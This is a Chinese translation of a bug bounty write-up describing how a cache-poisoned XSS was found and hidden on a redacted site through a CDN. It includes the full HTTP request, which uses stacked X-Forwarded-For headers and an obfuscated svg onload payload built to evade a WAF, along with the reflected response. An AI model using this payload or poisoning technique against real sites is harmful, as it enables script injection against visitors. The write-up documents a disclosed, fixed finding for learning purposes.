<html>
<head>
<title>How I Made $16,500 Hacking CDN Caching Servers — Part 2</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">我如何通过入侵CDN缓存服务器赚到16500美元——第二部分</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/how-i-made-16-500-hacking-cdn-caching-servers-part-2-4995ece4c6e6?source=collection_archive---------1-----------------------#2022-01-29">https://infosecwriteups.com/how-i-made-16-500-hacking-cdn-caching-servers-part-2-4995ece4c6e6?source=collection_archive---------1-----------------------#2022-01-29</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><div class=""><h2 id="3217" class="pw-subtitle-paragraph jn ip iq bd b jo jp jq jr js jt ju jv jw jx jy jz ka kb kc kd ke dk translated">@bxmbn</h2></div><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div class="gh gi kf"><img src="../Images/0e9c917ff9ee765e0488c6c45b3afa3b.png" data-original-src="https://miro.medium.com/v2/resize:fit:1220/format:webp/1*pyZEcnS5fLESc8yUS4wbdA.png"/></div></figure></div><div class="ab cl kn ko hu kp" role="separator"><span class="kq bw bk kr ks kt"/><span class="kq bw bk kr ks kt"/><span class="kq bw bk kr ks"/></div><div class="ij ik il im in"><h1 id="5117" class="ku kv iq bd kw kx ky kz la lb lc ld le jw lf jx lg jz lh ka li kc lj kd lk ll bi translated">隐藏XSS的好方法</h1><blockquote class="lm ln lo"><p id="f888" class="lp lq lr ls b lt lu jr lv lw lx ju ly lz ma mb mc md me mf mg mh mi mj mk ml ij bi translated"><em class="iq">赏金:2000美元</em></p></blockquote><p id="2947" class="pw-post-body-paragraph lp lq iq ls b lt lu jr lv lw lx ju ly mm ma mb mc mn me mf mg mo mi mj mk ml ij bi translated">在Google Dorking时，我发现了一个特定的URL，但这次没有被缓存，而是添加了一个可缓存的扩展文件(。js，。css)在URL的末尾，它将缓存响应。</p><p id="3f09" class="pw-post-body-paragraph lp lq iq ls b lt lu jr lv lw lx ju ly mm ma mb mc mn me mf mg mo mi mj mk ml ij bi translated">现在，我只需要找到一个XSS。我在一个Cookie上找到了一个注入点，但是当我在%20之后添加任何东西时，WAF就会被触发</p><pre class="kg kh ki kj gt mp mq mr ms aw mt bi"><span id="d2a7" class="mu kv iq mq b gy mv mw l mx my">Cookie: cookiename=xss&lt;/script%20</span></pre><p id="dc06" class="pw-post-body-paragraph lp lq iq ls b lt lu jr lv lw lx ju ly mm ma mb mc mn me mf mg mo mi mj mk ml ij bi translated">在试图绕过WAF时，我意识到我的IP也反映在同一个脚本上..</p><pre class="kg kh ki kj gt mp mq mr ms aw mt bi"><span id="396c" class="mu kv iq mq b gy mv mw l mx my">guid="&lt;/script ","24.99.19.20"</span></pre><p id="67e7" class="pw-post-body-paragraph lp lq iq ls b lt lu jr lv lw lx ju ly mm ma mb mc mn me mf mg mo mi mj mk ml ij bi translated">由于我的IP被反射，我尝试了“X-Forwarded-For”报头，这样我可以关闭<script>并避免WAF，因为如果它检测到&lt;[anything]&gt;就会触发&lt;/root&gt;</script></p><p id="f2fa" class="pw-post-body-paragraph lp lq iq ls b lt lu jr lv lw lx ju ly mm ma mb mc mn me mf mg mo mi mj mk ml ij bi translated">这就是为什么您会看到3个“X-Forwarded-For”标题</p><h2 id="f9ff" class="mu kv iq bd kw mz na dn la nb nc dp le mm nd ne lg mn nf ng li mo nh ni lk nj bi translated">请求:</h2><pre class="kg kh ki kj gt mp mq mr ms aw mt bi"><span id="de99" class="mu kv iq mq b gy mv mw l mx my">GET /xxx/xx/xxx.xx/x.js?t=2021111121 HTTP/2 <br/>Host: Redacted<br/>X-Forwarded-For: xss <br/>X-Forwarded-For: xss&gt;&lt;svg/onload=globalThis[`al`+/ert/.source]`1`// X-Forwarded-For: &gt; <br/>Cookie: gdId=xss&lt;/script%20</span></pre><h2 id="a5bc" class="mu kv iq bd kw mz na dn la nb nc dp le mm nd ne lg mn nf ng li mo nh ni lk nj bi translated">回应:</h2><pre class="kg kh ki kj gt mp mq mr ms aw mt bi"><span id="c6a2" class="mu kv iq mq b gy mv mw l mx my">...<br/>guid="&lt;/script ","24.99.19.20","xss","xss&gt;&lt;svg/onload=globalThis[`al`+/ert/.source]`1`//,"&gt;<br/>...</span></pre><p id="9d4a" class="pw-post-body-paragraph lp lq iq ls b lt lu jr lv lw lx ju ly mm ma mb mc mn me mf mg mo mi mj mk ml ij bi translated">在用XSS毒化了一个URL之后，攻击者只需要把它发送给受害者</p><pre class="kg kh ki kj gt mp mq mr ms aw mt bi"><span id="5f0b" class="mu kv iq mq b gy mv mw l mx my">redacted.com/xxx/xx/xxx.xx/x.js?t=2021111121</span></pre><p id="0649" class="pw-post-body-paragraph lp lq iq ls b lt lu jr lv lw lx ju ly mm ma mb mc mn me mf mg mo mi mj mk ml ij bi translated">隐藏XSS·:D的好方法</p><p id="bc0a" class="pw-post-body-paragraph lp lq iq ls b lt lu jr lv lw lx ju ly mm ma mb mc mn me mf mg mo mi mj mk ml ij bi translated">这是我最喜欢的缓存中毒，它是在一个公共程序中发现的</p><p id="90a9" class="pw-post-body-paragraph lp lq iq ls b lt lu jr lv lw lx ju ly mm ma mb mc mn me mf mg mo mi mj mk ml ij bi translated">【https://hackerone.com/reports/1424094 T4】</p></div><div class="ab cl kn ko hu kp" role="separator"><span class="kq bw bk kr ks kt"/><span class="kq bw bk kr ks kt"/><span class="kq bw bk kr ks"/></div><div class="ij ik il im in"><h1 id="68f2" class="ku kv iq bd kw kx ky kz la lb lc ld le jw lf jx lg jz lh ka li kc lj kd lk ll bi translated">时间线:</h1><blockquote class="lm ln lo"><p id="2701" class="lp lq lr ls b lt lu jr lv lw lx ju ly lz ma mb mc md me mf mg mh mi mj mk ml ij bi translated">上报→2021年12月11日</p><p id="da0a" class="lp lq lr ls b lt lu jr lv lw lx ju ly lz ma mb mc md me mf mg mh mi mj mk ml ij bi translated">分流→2021年12月14日</p><p id="0068" class="lp lq lr ls b lt lu jr lv lw lx ju ly lz ma mb mc md me mf mg mh mi mj mk ml ij bi translated">悬赏奖金→2022年1月7日</p><p id="e1bc" class="lp lq lr ls b lt lu jr lv lw lx ju ly lz ma mb mc md me mf mg mh mi mj mk ml ij bi translated">固定→2022年3月7日</p></blockquote></div><div class="ab cl kn ko hu kp" role="separator"><span class="kq bw bk kr ks kt"/><span class="kq bw bk kr ks kt"/><span class="kq bw bk kr ks"/></div><div class="ij ik il im in"><h1 id="683f" class="ku kv iq bd kw kx ky kz la lb lc ld le jw lf jx lg jz lh ka li kc lj kd lk ll bi translated">接下来:</h1><p id="6acb" class="pw-post-body-paragraph lp lq iq ls b lt nl jr lv lw nm ju ly mm nn mb mc mn no mf mg mo np mj mk ml ij bi translated">第3部分:通过X-Forwarded-Scheme头的缓存中毒DoS</p></div><div class="ab cl kn ko hu kp" role="separator"><span class="kq bw bk kr ks kt"/><span class="kq bw bk kr ks kt"/><span class="kq bw bk kr ks"/></div><div class="ij ik il im in"><h1 id="e700" class="ku kv iq bd kw kx ky kz la lb lc ld le jw lf jx lg jz lh ka li kc lj kd lk ll bi translated">🔈 🔈Infosec Writeups正在组织其首次虚拟会议和网络活动。如果你对信息安全感兴趣，这是最酷的地方，有16个令人难以置信的演讲者和10多个小时充满力量的讨论会议。<a class="ae nk" href="https://iwcon.live/" rel="noopener ugc nofollow" target="_blank">查看更多详情并在此注册。</a></h1><div class="nq nr gp gr ns nt"><a href="https://iwcon.live/" rel="noopener  ugc nofollow" target="_blank"><div class="nu ab fo"><div class="nv ab nw cl cj nx"><h2 class="bd ir gy z fp ny fr fs nz fu fw ip bi translated">IWCon2022 - Infosec书面报告虚拟会议</h2><div class="oa l"><h3 class="bd b gy z fp ny fr fs nz fu fw dk translated">与世界上最优秀的信息安全专家建立联系。了解网络安全专家如何取得成功。将新技能添加到您的…</h3></div><div class="ob l"><p class="bd b dl z fp ny fr fs nz fu fw dk translated">iwcon.live</p></div></div><div class="oc l"><div class="od l oe of og oc oh kl nt"/></div></div></a></div></div></div>    
</body>
</html>